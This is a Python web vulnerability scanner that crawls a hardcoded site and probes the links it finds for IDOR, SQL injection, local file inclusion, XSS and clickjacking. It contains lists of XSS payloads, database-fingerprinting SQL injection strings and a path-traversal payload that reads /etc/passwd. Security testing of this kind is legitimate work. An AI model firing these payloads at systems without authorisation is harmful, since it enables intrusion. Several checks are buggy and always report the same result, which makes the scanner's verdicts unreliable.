#!/bin/python3
from urllib.parse import urlparse
import requests
import os
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin
import ssl, re
from urllib.request import urlopen
import sys
import requests.exceptions
from urllib.request import HTTPError
from requests.exceptions import MissingSchema
import urllib.request as urllib
import random
from urllib.parse import urlsplit
from collections import deque
import colorama

url = "https://webapppentest.wordpress.com/" # change this URL

"""
reponse_406 function NOT CALLED
Note: printres is NOT a function instead a dictonary.
Some Scanning Function doesnt have proper o/p to be stored in printres (eg: LFI)
LFI FALSE Positive Result
Problem With printres, We arent storing the URL associated with the particular result, so some will be vulnerable some wont show as vulnerable!
"""

"""
php_files = []
directories = []
files = []
"""
vuln_links = []
printres = dict()


## RESPONSE CODE 406
"""
def not_acceptable_response(URL):
    fishy='<Response [406]>'
    words='Server'  
    #Enter the url down below 
    print("\n[+] Runnning 406 response test in",URL)
    s=requests.get(URL)
    #print(s)
    if len(URL) == 0:
        print('URL not entered')
        return 
    for fishy in s:
        break
        #print('Something fishy')
    q=s.headers
    if words in q:
        print( '[*] Sensitive data is secure',URL)
    else:
        print( '[!] Sensitive data is AT RISK',URL)
"""

## IDOR
def idor(url):
    #for url in directories+php_files:
    params = []
    #print("\n[+] Running Tests for IDOR on",url)
    link=''
    #Handles the SSl certificate errors
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    html = urlopen(url, context=ctx).read()
    soup = bs(html, "html.parser")
    tags = soup('a')
    general_links = list()
    vuln_links = list()
        
    for tag in tags:
        link1 = tag.get('href',None)
        link=str(link1)
        #print(link)
        zzz=".+\?.+"
        # Checks for possible links
        if re.findall(zzz, link):
            general_links.append(link)
            # Checks for specific that are prone to bruteforcing 
            if re.findall('\?.+=[0-9]+.',link):
                vuln_links.append(link)
        

    #                # Checks if and only the parameter has numeric value and only had occured once 
    #                if re.search('([0-9]+)', url): #  <---------------- this part needs work cant get the regex to extract 
    #                    vuln_links[link] = is_brute_forcable(link)
    #                else :
    #                    # Havent designed to check for multiple parameters
    #                    vuln_links[link] = 'Dont know'

    if len(general_links) != 0:
        """
        print('--------------------------------------------------------------------')
        print("---> Possible Vulnerable links found ")
        print('--------------------------------------------------------------------', end='\n')
        """
        #Prints out all the links 
        #print(*vuln_links, sep='\n')
        for vulns in vuln_links:
            a = vulns.find('?')
            b = vulns.find('=')
            if params == [] or vulns[a+1:b] not in params:
                params.append(vulns[a+1:b])
                if "www" not in vulns:
                    x = vulns.find('=')
                    vulns = vulns[:x+1]
                    if "./" in vulns:
                        k = vulns.find('./')
                        #print(vulns[k+2:])
                        vuln_links.append(url+vulns[k+2:])
                    else:
                        #print(vulns)
                        vuln_links.append(url+vulns)
            else:
                continue   
            """
            print('--------------------------------------------------------------------')
            print("---> All links found on the webpage that had arguments in the url")
            print('--------------------------------------------------------------------', end='\n')
            """           
            #print(*general_links, sep='\n')
        for gens in general_links:
            a = gens.find('?')
            b = gens.find('=')
            if params == [] or gens[a+1:b] not in params:
                params.append(gens[a+1:b])
                if "www" not in gens:
                    x = gens.find('=')
                    gens = gens[:x+1]
                    if "./" in gens:
                        k = gens.find('./')
                        #print(gens[k+2:])
                        vuln_links.append(url+gens[k+2:])
                    else: 
                        #print(gens)
                        vuln_links.append(url+gens)
            else:
                continue
        printres.update(IDOR = "Is Vulnerable")
        #print("[!] Vulnerable To IDOR")
        #print("[*] Saved in links.txt")
    else:
        #print("[!] Not Vulnerable To IDOR")
        printres.update(IDOR = "Not Vulnerable")






##XSS
def get_all_forms(url):
    soup = bs(requests.get(url).content, "html.parser")
    return soup.find_all("form")

def get_form_details_xss(form):
    details = {}
    action = form.attrs.get("action").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def submit_form_xss(form_details, url, value):
    target_url = urljoin(url, form_details["action"])
    inputs = form_details["inputs"]
    data = {}
    for input in inputs:
        if input["type"] == "text" or input["type"] == "search":
            input["value"] = value
        input_name = input.get("name")
        input_value = input.get("value")
        if input_name and input_value:
            data[input_name] = input_value

    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        return requests.get(target_url, params=data)

def scan_xss(url):
    is_vulnerable = False
    forms = get_all_forms(url)
    #print("\n[+] Scanning for XSS in",url)
    xss_payloads = []
    xss_forms = []
    payloads = [ "<script>alert('XSS')</script>", "<scr<script>ipt>alert('XSS')</scr<script>ipt>",
        '"><script>alert(1)</script>', '"><script>alert(String.fromCharCode(88,83,83))</script>',"<img src=x onerror=alert('XSS');>","<img src=x onerror=alert('XSS')//",
        "<img src=x onerror=alert(String.fromCharCode(88,83,83));>", '<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>',
        "<img src=x:alert(alt) onerror=eval(src) alt=xss>",'"><img src=x onerror=alert(1);>','"><img src=x onerror=alert(String.fromCharCode(88,83,83));>',
        "<svg onload=alert(1)>", "<svg/onload=alert('XSS')>",
        "<svg onload=alert(1)//", "<svg/onload=alert(String.fromCharCode(88,83,83))>","<svg id=alert(1) onload=eval(id)>",
        '"><svg/onload=alert(String.fromCharCode(88,83,83))>','"><svg/onload=alert(/XSS/)',"<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)",
        '<div onpointerover="alert(45)">MOVE HERE</div>','<div onpointerdown="alert(45)">MOVE HERE</div>',
        '<div onpointerenter="alert(45)">MOVE HERE</div>','<div onpointerleave="alert(45)">MOVE HERE</div>','<div onpointermove="alert(45)">MOVE HERE</div>',
        '<div onpointerout="alert(45)">MOVE HERE</div>','<div onpointerup="alert(45)">MOVE HERE</div>',
        "/<svg onload=alert(1)","/<script>alert('XSS');//","/<input autofocus onfocus=alert(1)>"                
    ]
    for form in forms:
        form_details = get_form_details_xss(form)
        for script in payloads:
            content = submit_form_xss(form_details, url, script).content.decode()
            if script in content:
                xss_payloads.append(script)
                xss_forms.append(form)
                #print(script)
                printres.update(XSS = 'Is Vulnerable')
                is_vulnerable = True
                break
    #print(xss_payloads)
    #print(xss_forms)
    is_vulnerable = False
    printres.update(XSS = 'Not Vulnerable')





#ENUMDIRB
"""
def request(url):
    try:
        resp =  requests.get(url)
        if resp.status_code == 200:
           return True
    except requests.exceptions.ConnectionError:
        pass
    return False

def enum(url,wordlist,exts):
    direct = []
    files = []
    flag = 0
    url = url.strip()
    if url[-1] == "/":
        url = url[:-1]
    print("----------| Discovered directory at this link |----------")
    for new_dir in range(0,len(wordlist)):
        if flag == 1:
            try:
                url = direct[new_dir-1]
            except:
                break
            print("Enumerating in :",url)
        flag = 0
        for line in wordlist:
            furl = url+"/"+line
            #print("Check Dir:",furl)
            response = requests.get(furl)
            if response.status_code != 404:
                direct.append(furl)
            for e in exts:
                if e != "":
                    temp_url = furl+"." + e
                    #print("Check File:",temp_url)
                response = requests.get(temp_url)
                if response.status_code != 404:
                    files.append(temp_url)
                    if e == "php":
                        php_files.append(temp_url)
            if line is wordlist[len(wordlist)-1]:
                flag = 1
                break

    if len(direct) == 0 and len(files) == 0:
       print ("[!] Not Found")
    return direct,files

def enumdirb(url):
    #url = "http://192.168.0.107/"
    if url and request(url):
        words = []
        #filename = input("Enter custom wordlists file:") #any of ur choice, i used /usr/share/wordlists/wfuzz/general/common.txt
        filename = "/usr/share/wordlists/wfuzz/general/common.txt"
        if filename != "":
            try:
                fh = open(filename,'r')
                for word in fh:
                    word = word.splitlines()
                    words += word
            except:
                print("Error opening wordlist file!")
                os.sys.exit()
        else:
            try:
                print("Creating custom wordlist!")
                s = ("cewl -w wordlist.txt -d 4 -m 4 "+url)
                os.system(s)
                fhand = open("wordlist.txt",'r')
                for word in fhand:
                    word = word.splitlines()
                    words += word
                print("words:",words)
            except:
                print("CeWL not installed!")
                os.system("sudo apt-get install cewl")
                s = ("cewl -w wordlist.txt -d 4 -m 4 "+url)
                os.system(s)
                fhand = open("wordlist.txt",'r')
                for word in fhand:
                    word = word.splitlines()
                    words += word
                print("Words:",words)
        exts = []
        e = input("Enter the extension [txt,php...]:")
        if e != '':
            if "," in e:
                exts += e.split(",")
            else:
                exts.append(e)

        if not exts:
            exts = ["php","html","xml","txt"]


        print("Extensions:",exts)
        print("URL:",url)
        directories,files = enum(url,words,exts)
        print ("Directories:",directories)
        print("Files:",files)
        print("Php:",php_files)
    else:
        print ("\n[!] : Invalid URL")
"""


##SQLI   
def get_all_forms_sqli(url):
    """Given a `url`, it returns all forms from the HTML content"""
    soup = bs(requests.get(url).content, "html.parser")
    return soup.find_all("form"),soup.find_all("input")

def get_form_details_sqli(form):
    """
    This function extracts all possible useful information about an HTML `form`
    """
    details = {}
    # get the form action (target url)
    action = form.attrs.get("action").lower()
    # get the form method (POST, GET, etc.)
    method = form.attrs.get("method", "get").lower()
    # get all the input details such as type and name
    inputs = []
    cookies = {}
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        if input_name == 'csrf' or input_name == 'PHPSESSID':
            cookies[input_name] = input_tag.attrs.get("value")
        inputs.append({"type": input_type, "name": input_name})
    # put everything to the resulting dictionary
    #print(cookies)
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details,cookies

def db_info(url):
    success_db = []
    db = [["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
	  ["connection_id()=connection_id()"                 ,"MYSQL"],
	  ["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
	  ["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
	  ["@@CONNECTIONS>0"                                 ,"MSSQL"],
	  ["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
	  ["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
 	  ["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
	  ["ROWNUM=ROWNUM"                                   ,"ORACLE"],
	  ["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
	  ["LNNVL(0=123)"                                    ,"ORACLE"],
	  ["5::int=5"                                        ,"POSTGRESQL"],
	  ["5::integer=5"                                    ,"POSTGRESQL"],
	  ["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
	  ["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
	  ["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
	  ["current_database()=current_database()"           ,"POSTGRESQL"],
	  ["sqlite_version()=sqlite_version()"               ,"SQLITE"],
	  ["last_insert_rowid()>1"                           ,"SQLITE"],
	  ["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
	  ["val(cvar(1))=1"                                  ,"MSACCESS"],
	  ["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
  	  ["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
	  ["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
	  ["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"]]
    for payload in db:
        r =  requests.get(url+payload[0])
        if r.status_code == 500:
            success_db.append(payload)
            return True

    return False

def submit_form_sqli(form_details, url, value, cookie):
    # construct the full URL (if the url provided in action is relative)
    target_url = urljoin(url, form_details["action"])
    # get the inputs
    #test = input("Enter the cookie:")
    inputs = form_details["inputs"]
    data = {}
    for inputt in inputs:
        # replace all text and search values with `value`
        if inputt["type"] == "text" or inputt["type"] == "search" or inputt["type"] == "username" or inputt["type"] == "password" or inputt["type"] == "hidden":
            if cookie == {}:
                continue
            else: 
                if 'csrf' in inputt["name"] or 'PHPSESSID' in inputt["name"]:
                    inputt["value"] = cookie[inputt["name"]]
                    #inputt["value"] = test
                    #print("test:",test)
                else:
                    inputt["value"] = value
        input_name = inputt.get("name")
        input_value = inputt.get("value")
        if input_name and input_value:
            # if input name and value are not None, 
            # then add them to the data of form submission
            data[input_name] = input_value
            
    #print(target_url,data)
    if form_details["method"] == "post":
        result =  requests.post(target_url, data=data)
        #print(result.text)
        if result.status_code == 500:
            return True
        else:
            return False

    else:
        # GET request
        result = requests.get(target_url, params=data)
        #print(result.text)
        if result.status_code == 500:
            return True
        else:
            return False


def scan_sqli(url):
    # get all the forms from the URL
    forms,inputs = get_all_forms_sqli(url)
    
    #print("\n[+] Running SQLi on ",url)
    payloads = []
    fh = open("auth_bypass.txt","r")
    for words in fh:
        words = words.split('\n')
        payloads.append(words[0])
    # returning value
    is_vulnerable = False
    
    # iterate over all forms
    if len(forms) != 0:
        for form in forms:
            form_details,cookie = get_form_details_sqli(form)
            if submit_form_sqli(form_details, url, payloads[0], cookie):
                is_vulnerable = True
                break
    else:
        if db_info(url):
            is_vulnerable = True        
    
    if is_vulnerable is True:
        printres.update(SQLI= "Is Vulnerable")
    else:
        printres.update(SQLI = "Not Vulnerable")

##LFI
def scan_lfi(url):
    #print("\n[+] Running LFI scan on",url)
    payld='../../../../../etc/passwd%00'
    vuln1='root:x:0:0:root:/root:/bin/bash'
    vuln2='mail:x:8:'
    #url=input("please enter the URL")
    scanurl=urlparse(url)
    foundvln='[!] Local File Inclusion Vulnerability Found!!!'
    invaldurl='[-] Invalid URL!!!'
    error1='[-] The conection could not be established!!!'
    error2='[-] Request Timed out!!!'
    notfound='[-] Local File Inclusion Vulnerability NOT FOUND'
    #print(scanurl)

    if len(scanurl.path)==0:
        printres.update(LFI = "URL doesn't contain a script")
    if len(scanurl.query)==0:
        printres.update(LFI = "The URL doesn't contain a query string")
        return error1
    #check for path and query
    parameters=dict([part.split('=') for part in scanurl[4].split('&')])
    #print(len(parameters))
    #if need for checking multiple params
    for index, item in enumerate(parameters):
        pass #print('')
    for key, value in parameters.items():
        if key==item:
            pass #print('')

    pld=item+'='+payld
    lfi11=''.join(scanurl[0:1])+'://'
    lfi22=''.join(scanurl[1:2])
    lfi33=''.join(scanurl[2:3])+'?'
    lfi44=''.join(pld)
    lfi14=lfi11+lfi22+lfi33+lfi44
    #print('The payload URL is - '+ lfi14)
    s=requests.Session()
    """try: 
        s=requests.Session()
        get_cook=s.post(lfi14)
        cookie={'PHPSESSID': requests.utils.dict_from_cookiejar(s.cookies)['PHPSESSID']}
    except KeyError:
        return notfound
        sys.exit(1)"""
    #print(cookie)
    user_agents=[ "Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.25 (jaunty) Firefox/3.8",
              "Mozilla/5.0 (X11; Linux i686; rv:2.0b3pre) Gecko/20100731 Firefox/4.0b3pre",
              "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6)",
              "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en)",
              "Mozilla/3.01 (Macintosh; PPC)",
              "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.9)",
              "Mozilla/5.0 (X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01",
              "Opera/8.00 (Windows NT 5.1; U; en)",
              "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.1 Safari/525.19"
    ]
    try:
        user_agent=random.choice(user_agents)
        HEaders={'User-Agent':user_agent}
        lfires=s.get(lfi14).text
        #print(lfires)
        if vuln1 or vuln2 in lfires:
            print( foundvln)
    except HTTPError:
        print( error1)
        #print('Error Code:)
        #sys.exit(1)
    #except Timeout as e:
    except requests.exceptions.Timeout as e:
        print(error2)
        #print('Error Code:' +e)
        #sys.exit(1)
    except MissingSchema as e:
        print(invalidurl)
        #print('Error Code:'+ e)
        sys.exit(1)

    else:
        return notfound

#CLICKJACKING SCANNER
def scan_click(url):

    #url=input("please enter the url")
    zz='<Response [406]>'
    s=requests.get(url)
    #print(s)
    if s!='<Response [200]>':
        print('clickjacking', 'invalid url')
        #sys.exit(1)
        
    frm='iframe' 
    xfrm='Content-Security-Policy'
    xfrm2='X-Frame-Options'
    s=requests.session()
    r=s.get(url)
    r1=r.headers
    #print(r1)
    if xfrm in r1 or xfrm2 in r1:
        printres(clickjacking = 'Not Vulnerable')
    elif frm in r:
        printres.update(clickjacking ='Is Vulnerable')
    else:
        pass

## CRAWLER
def limit_crawler(domain, ofile, limit, mute):
    try:
        # a queue of urls to be crawled
        new_urls = deque([domain])
        # a set of urls that we have already crawled
        processed_urls = set()
        # a set of domains inside the target website
        limit_urls = set()
        # a set of domains outside the target website
        limit_urls = set()
        # a set of broken urls
        broken_urls = set()

        # process urls one by one until we exhaust the queue
        while len(new_urls):

            # move next url from the queue to the set of processed urls
            url = new_urls.popleft()
            processed_urls.add(url)
            # get url's content
            #print("Processing %s" % url)
            try:
                response = requests.get(url)
                #print(url)
            except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError, requests.exceptions.InvalidURL, requests.exceptions.InvalidSchema):
                # add broken urls to it's own set, then continue
                broken_urls.add(url)
                continue

            # extract base url to resolve relative links
            parts = urlsplit(url)
            base = "{0.netloc}".format(parts)
            strip_base = base.replace("www.", "")
            base_url = "{0.scheme}://{0.netloc}".format(parts)
            path = url[:url.rfind('/')+1] if '/' in parts.path else url

            # create a beutiful soup for the html document
            soup = bs(response.text, "lxml")

            for link in soup.find_all('a'):
                # extract link url from the anchor
                anchor = link.attrs["href"] if "href" in link.attrs else ''
                #print(anchor)
                if domain in anchor:
                    ofile.append(anchor)
            

                if limit in anchor:
                    limit_urls.add(anchor)
                else:
                    pass

            for i in limit_urls:
                if not i in new_urls and not i in processed_urls:
                    new_urls.append(i)

        return ofile
    
    except KeyboardInterrupt:
        sys.exit()


#enumdirb(url)
domain = url
ofile= []
mute=0
limit=domain
links = limit_crawler(domain,ofile,limit,mute)
#print(":",links)
#not_acceptable_response()
for urls in links:
    #print(urls)
    idor(urls)
print(printres)
#print("----------| Enumerating The Following Links for SQLI/LFI/XSS/CLICKJACK |----------")
#for url in php_files+directories+files:

for urls in vuln_links+links:
    #print("Enumerating :",urls)
    scan_sqli(urls)
    scan_lfi(urls)
    scan_xss(urls)
    if "login" in urls or "home" in urls:
        scan_click(urls)
    print(printres)


